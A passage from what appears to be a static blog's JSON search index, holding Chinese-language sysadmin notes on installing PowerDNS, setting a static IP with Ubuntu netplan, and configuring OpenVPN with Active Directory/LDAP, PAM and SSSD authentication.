style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e (id)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e comments_name_type_idx \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e comments (name, \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e comments_order_idx \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e comments (domain_id, modified_at);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e domainmetadata (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  id                    INT AUTO_INCREMENT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  domain_id             INT \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  kind                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  content               TEXT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e (id)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e domainmetadata_idx \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e domainmetadata (domain_id, kind);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e cryptokeys (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  id                    INT AUTO_INCREMENT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  domain_id             INT \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  flags                 INT \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  active                BOOL,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  content               TEXT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e(id)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e domainidindex \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e cryptokeys(domain_id);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e tsigkeys (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  id                    INT AUTO_INCREMENT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  algorithm             VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  secret                VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e (id)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eUNIQUE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e namealgoindex \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e tsigkeys(name, algorithm);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo systemctl disable systemd-resolved\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo systemctl stop systemd-resolved\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls -lh /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elrwxrwxrwx \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e root root \u003cspan style=\"color:#ae81ff\"\u003e39\u003c/span\u003e Jul \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e 15:50 /etc/resolv.conf -\u0026gt; ../run/systemd/resolve/stub-resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo unlink /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nameserver 8.8.8.8\u0026#34;\u003c/span\u003e | sudo tee /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAdd official PowerDNS repository for Ubuntu 22.04|20.04|18.04.\u003c/p\u003e","tags":["URL","DNS","Linux","PowerDNS"],"title":"Install PowerDNS and PowerDNS-Admin on Ubuntu 22.04|20.04|18.04"},{"categories":["URL","Linux","Ubuntu","Network"],"contents":" Ubuntu 18.04 透過 netplan 設定網路卡 IP 照上面的說明看了一下 /etc/netplan 目錄，查閱一下 /etc/netplan/50-cloud-init.yaml，如下：\n# This file is generated from information provided by # the datasource. Changes to it will not persist across an instance. # To disable cloud-init\u0026#39;s network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} network: ethernets: ens192: dhcp4: true ens224: dhcp4: true version: 2 看來可以關閉 cloud network，但是我其實也沒有要用 cloud-init，乾脆移除它，如下：\nsudo apt-get remove cloud-init\n然後把 /etc/netplan/50-cloud-init.yaml 改成下面這樣：\n# This file is generated from information provided by # the datasource. Changes to it will not persist across an instance. # To disable cloud-init\u0026#39;s network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} network: ethernets: ens192: addresses: [192.168.32.231/24] gateway4: 192.168.32.1 nameservers: addresses: [8.8.8.8, 8.8.4.4] dhcp4: no ens224: dhcp4: true version: 2 這幾年 yaml 深得大眾的心，設定檔就是要用 yaml 格式才是潮，解說一下上述幾個設定：\ndhcp4: 關閉 DHCP 自動取得 IP，原本是 true 所以改成 no (官方文件竟然不是 false 有點搞笑，但我實際測試 false 也是可以 work 的) addresses: 靜態 IP 與 Mask nameservers: DNS 服務器，可以設定多筆 gateway4: IPv4 所使用的 Gateway 修改後存檔後輸入以下命令：\nsudo netplan try\n","date":"September 18, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200918-ubuntu-18-04/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.toright.com/posts/6293/ubuntu-18-04-%E9%80%8F%E9%81%8E-netplan-%E8%A8%AD%E5%AE%9A%E7%B6%B2%E8%B7%AF%E5%8D%A1-ip.html\" target=\"_blank\" rel=\"noopener\"\u003eUbuntu 18.04 透過 netplan 設定網路卡 IP\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e照上面的說明看了一下 /etc/netplan 目錄，查閱一下 /etc/netplan/50-cloud-init.yaml，如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# This file is generated from information provided by\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# the datasource.  Changes to it will not persist across an instance.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# To disable cloud-init\u0026#39;s network configuration capabilities, write a file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# network: {config: disabled}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eethernets\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eens192\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edhcp4\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eens224\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edhcp4\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看來可以關閉 cloud network，但是我其實也沒有要用 cloud-init，乾脆移除它，如下：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt-get remove cloud-init\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e然後把 /etc/netplan/50-cloud-init.yaml 改成下面這樣：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# This file is generated from information provided by\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# the datasource.  Changes to it will not persist across an instance.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# To disable cloud-init\u0026#39;s network configuration capabilities, write a file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# network: {config: disabled}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eethernets\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eens192\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eaddresses\u003c/span\u003e: [\u003cspan style=\"color:#ae81ff\"\u003e192.168.32.231\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/24]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003egateway4\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e192.168.32.1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003enameservers\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eaddresses\u003c/span\u003e: [\u003cspan style=\"color:#ae81ff\"\u003e8.8.8.8\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8.8.4.4\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edhcp4\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003eno\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eens224\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edhcp4\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這幾年 yaml 深得大眾的心，設定檔就是要用 yaml 格式才是潮，解說一下上述幾個設定：\u003c/p\u003e","tags":["URL","Linux","Ubuntu","Network"],"title":"Ubuntu 18.04 透過 netplan 設定網路卡 IP"},{"categories":["URL","Linux","Windows","AD","LDAP","VPN"],"contents":" openvpn 部署之部署基於 AD 域認證 OpenVPN + PAM + SSSD + Active Directory https://computingforgeeks.com/install-and-configure-openvpn-server-on-rhel-centos-8/ https://www.redhat.com/en/blog/consistent-security-crypto-policies-red-hat-enterprise-linux-8 https://medium.com/jerrynotes/linux-authentication-windows-ad-without-join-domain-7963c3fd44c5 # 安裝openvpn yum install openvpn -y yum -y install openssl openssl-devel -y yum -y install lzo lzo-devel -y yum install -y libgcrypt libgpg-error libgcrypt-devel # 安裝openvpn認證插件 yum install openvpn-auth-ldap -y # 安裝easy-rsa # 由於openvpn2.3之後，在openvpn裏面剔除了easy-rsa文件，所以需要單獨安裝 yum install easy-rsa cp -rf /usr/share/easy-rsa/2.0 /etc/opevpn/ # 生成openvpn的key及證書 # 修改 `/opt/openvpn/etc/easy-rsa/2.0/vars` 參數 export KEY_COUNTRY=\u0026#34;CN\u0026#34; # 國家 export KEY_PROVINCE=\u0026#34;ZJ\u0026#34; # 省份 export KEY_CITY=\u0026#34;NingBo\u0026#34; # 城市 export KEY_ORG=\u0026#34;TEST-VPN\u0026#34; # 組織 exportKEY_EMAIL=\u0026#34;81367070@qq.com\u0026#34; # 郵件 export KEY_OU=\u0026#34;baidu\u0026#34; # 單位 source vars ./clean-all ./build-ca ./build-dh ./build-key-server server ./build-key client1 # 編輯openvpn服務端配置文件：`/etc/openvpn/server.conf` port 1194 proto udp dev tun ca keys/ca.crt cert keys/server.crt key keys/server.key # This file should be kept secret dh keys/dh2048.pem server 10.8.0.0 255.255.255.0 //客戶端分配的ip地址 push \u0026#34;route 192.168.1.0 255.255.255.0\u0026#34; //推送客戶端的路由 push \u0026#34;redirect-gateway\u0026#34; //修改客戶端的網關，使其直接走vpn流量 ifconfig-pool-persist ipp.txt keepalive 10 120 comp-lzo persist-key persist-tun status openvpn-status.log verb 3 plugin /usr/lib64/openvpn/plugin/lib/openvpn-auth-ldap.so \u0026#34;/etc/openvpn/auth/ldap.conf\u0026#34; client-cert-not-required username-as-common-name log /var/log/openvpn.log # 修改openvpn-ldap-auth的配置文件 `/etc/openvpn/auth/ldap.conf` # /etc/openvpn/auth/ldap.conf \u0026lt;LDAP\u0026gt; # LDAP server URL # 更改爲 AD 服務器的 IP URL ldap://172.16.76.238:389 # Bind DN (If your LDAP server doesn\u0026#39;t support anonymous binds) # BindDN uid=Manager,ou=People,dc=example,dc=com # 更改爲域管理的 DN, 可以通過 ldapsearch 進行查詢 # -h 的 ip 替換爲服務器 ip，-D 換爲管理員的 dn，-b 爲基礎的查詢 dn，* 爲所有 # ldapsearch -LLL -x -h 172.16.76.238 -D \u0026#34;administrator@xx.com\u0026#34; -W -b \u0026#34;dc=xx,dc=com\u0026#34; \u0026#34;*\u0026#34; BindDN \u0026#34;cn=administrator,cn=Users,dc=xx,dc=com\u0026#34; # Bind Password # Password SecretPassword # 域管理員的密碼 Password passwd # Network timeout (in seconds) Timeout 15 # Enable Start TLS TLSEnable no # Follow LDAP Referrals (anonymously) FollowReferrals no # TLS CA Certificate File # TLSCACertFile /usr/local/etc/ssl/ca.pem # TLS CA Certificate Directory # TLSCACertDir /etc/ssl/certs # Client Certificate and key # If TLS client authentication is required # TLSCertFile /usr/local/etc/ssl/client-cert.pem # TLSKeyFile /usr/local/etc/ssl/client-key.pem # Cipher Suite # The defaults are usually fine here # TLSCipherSuite ALL:!ADH:@STRENGTH \u0026lt;/LDAP\u0026gt; \u0026lt;Authorization\u0026gt; # Base DN # 查詢認證的基礎 dn BaseDN \u0026#34;dc=boqii-inc,dc=com\u0026#34; # User Search Filter # SearchFilter \u0026#34;(\u0026amp;(uid=%u)(accountStatus=active))\u0026#34; # 其中 sAMAccountName=%u 的意思是把 sAMAccountName 的字段取值爲用戶名， # 後面 \u0026#34;memberof=CN=myvpn,DC=xx,DC=com\u0026#34; 指向要認證的 vpn 用戶組， # 這樣任何用戶使用 vpn，只要加入這個組就好了 SearchFilter \u0026#34;(\u0026amp;(sAMAccountName=%u)(memberof=CN=myvpn,DC=boqii-inc,DC=com))\u0026#34; # Require Group Membership RequireGroup false # Add non-group members to a PF table (disabled) # PFTable ips_vpn_users \u0026lt;Group\u0026gt; # BaseDN \u0026#34;ou=Groups,dc=example,dc=com\u0026#34; # SearchFilter \u0026#34;(|(cn=developers)(cn=artists))\u0026#34; # MemberAttribute uniqueMember # Add group members to a PF table (disabled) # PFTable ips_vpn_eng BaseDN \u0026#34;ou=vpn,dc=boqii-inc,dc=com\u0026#34; SearchFilter \u0026#34;(cn=openvpn)\u0026#34; MemberAttribute \u0026#34;member\u0026#34; \u0026lt;/Group\u0026gt; \u0026lt;/Authorization\u0026gt; 拷貝/etc/openvpn/key目錄下的ca.crt證書，以備客戶端使用。\n注：客戶端使用 ca.crt 和客戶端配置文件即可正常使用 openvpn 了，客戶端使用方法，不在本文範圍之內\nclient.ovpn\nclient dev tun proto udp //注意協議，跟服務器保持一致 remote xx.xx.com 1194 //xx.xx.com替換爲你的服務器ip resolv-retry infinite nobind persist-key persist-tun ca ca.crt auth-user-pass //客戶端使用賬戶密碼登陸的選項，用於客戶端彈出認證用戶的窗口 comp-lzo verb 3 https://github.com/Nyr/openvpn-install.git\n修改 /etc/openvpn/server/server.conf 讓 OpenVPN 支援 PAM local 10.0.0.10 #主機IP port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh.pem auth SHA512 tls-crypt tc.key topology subnet server 10.8.0.0 255.255.255.0 ifconfig-pool-persist ipp.txt push \u0026#34;redirect-gateway def1 bypass-dhcp\u0026#34; push \u0026#34;dhcp-option DNS 10.0.0.1\u0026#34; keepalive 10 120 cipher AES-256-CBC user nobody group nobody persist-key persist-tun status openvpn-status.log verb 3 crl-verify crl.pem explicit-exit-notify plugin /usr/lib64/openvpn/plugins/openvpn-plugin-auth-pam.so login #啟用PAM驗證, 使用預設設定檔/etc/pam.d/login 修改 Client 端的預設值, 由於用戶端要使用與主機不同網段 10.1.0.0/24 的資源故需要增加路由 /etc/openvpn/server/client-common.txt\nclient dev tun proto udp remote 1.2.3.4 1194 # 外部實體IP resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server auth SHA512 cipher AES-256-CBC ignore-unknown-option block-outside-dns block-outside-dns auth-user-pass # 除了openvpn本身的金鑰驗證, 另外開啟AD使用者帳號密碼驗證 verb 3 route 10.1.0.0 255.255.255.0 10.0.0.253 # 增加通往10.1.0.0/24網斷路由, 網關為10.0.0.253 更改完成後重新執行安裝命令產生新的 client 端 .ovpn 設定檔 ./openvpn-install.sh\n# 過程中選 Add a new user, 至於第一次產生的user設定可以選擇 Revoke an existing user # 移除掉. 產生的 .ovpn 檔會在/root資料夾下 # 取得網域憑證伺服器的Public key ,通常會在以下位址且檔名類似 \\\\caserver\\CertEnroll\\caserver_MYDOMAIN Root Certification Authority.crt 使用cifs工具掛載目錄後 下載到centos8上並轉為PEM格式 # 掛載cifs, server2003使用smb1.0所以參數須加上vers=1.0 mount.cifs //ca_server/CertEnroll /mnt/cifs -o user=administrator,pass=password,dom=mydomain,vers=1.0 cp /mnt/cifs/xxxx.crt xxxx.crt # 將der 轉換為 pem openssl x509 -inform der -in xxxx.crt -out xxxx.pem # 搬移到 trust資料夾 mv xxxx.pem /etc/pki/ca-trust/source/anchors # 將憑證更新至主機信任憑證裡 update-ca-trust # 設定sssd 連接 Active Directory # 修改 `/etc/sssd/sssd.conf` [sssd] services = nss, pam, ssh config_file_version = 2 domains = mydomain [sudo] [nss] [pam] offline_credentials_expiration = 60 [domain/mydomain] cache_credentials = True ldap_search_base = dc=mydomain,dc=com id_provider = ldap ldap_uri = ldaps://dc.mydomain.com:636 #AD主機, 使用ssl協定連線 ldap_schema = AD ldap_default_bind_dn = cn=administrator,cn=users,dc= mydomain,dc=com # 這裡為了方便使用管理員帳號, 為安全起見可以使用唯讀的網域帳號 ldap_default_authtok = password_for_administrator # 管理員密碼 ldap_tls_reqcert = demand ldap_tls_cacert = /etc/pki/tls/certs/ca-bundle.crt ldap_tls_cacertdir = /etc/pki/tls/certs ldap_search_timeout = 50 ldap_network_timeout = 60 ldap_id_mapping = True ldap_referrals = false enumerate = False fallback_homedir = /home/%u default_shell = /bin/bash # 修改 `/etc/openlap/ldap.conf` URI ldaps://dc.mydomain.com:636 base dc=mydomain,dc=com TLS_CACERT /etc/pki/tls/certs/ca-bundle.crt SASL_NOCANON on # 強制啟用sssd authselect select sssd -force systemctl enable --now sssd systemctl restart sssd # 由於Windows 2003 CA仍使用舊版SHA1, 因此需要改crypto政策 update-crypto-policies --set LEGACY # 完成後重新開機 # 防火牆上設定允許連向1.2.3.4 UDP1194的流量並引導至內部10.0.0.10 # 用戶端安裝OpenVPN Client軟體後匯入.ovpn檔 Windows7/8/10 Client: OpenVPN-GUI (嘗試過OpenVPN Connect for Windows無法匯入.ovpn) iOS/Android Client: OpenVPN Connect ","date":"September 17, 